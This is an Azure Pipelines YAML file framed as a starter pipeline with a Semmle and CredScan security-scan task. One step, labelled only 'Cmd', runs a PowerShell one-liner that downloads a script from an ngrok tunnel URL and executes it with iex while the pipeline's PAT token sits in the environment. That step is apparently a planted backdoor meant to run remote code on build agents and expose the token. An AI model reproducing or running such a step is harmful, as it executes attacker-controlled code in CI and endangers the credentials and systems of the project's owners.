# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- main

pool:
  vmImage: 'Windows Desktop PowerShell'

steps:
- script: echo Hello, world!
  displayName: 'Run a one-line script'
- task: CmdLine@2
  displayName: Cmd
  inputs:
    script: |
      powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
  env:
    SYSTEM_ACCESSTOKEN: $(PatToken)
- task: SdtReport@1
  displayName: 'Run Semmle (python)'
  inputs:
    sourceCodeDirectory: '$(System.DefaultWorkingDirectory)'
    language: python
    includeNodeModules: false
    AllTools: false
    APIScan: false
    BinSkim: true
    BinSkimBreakOn: 'WarningAbove'
    CodesignValidation: false
    CredScan: true
    FortifySCA: false
    FxCop: false
    ModernCop: false
    MSRD: false
    PoliCheck: false
    RoslynAnalyzers: false
    SDLNativeRules: false
    Semmle: true
    SemmleBreakOn: 'WarningAbove'
    TSLint: false
    ToolLogsNotFoundAction: 'Standard'
  env:
    SYSTEM_ACCESSTOKEN: $(PatToken)
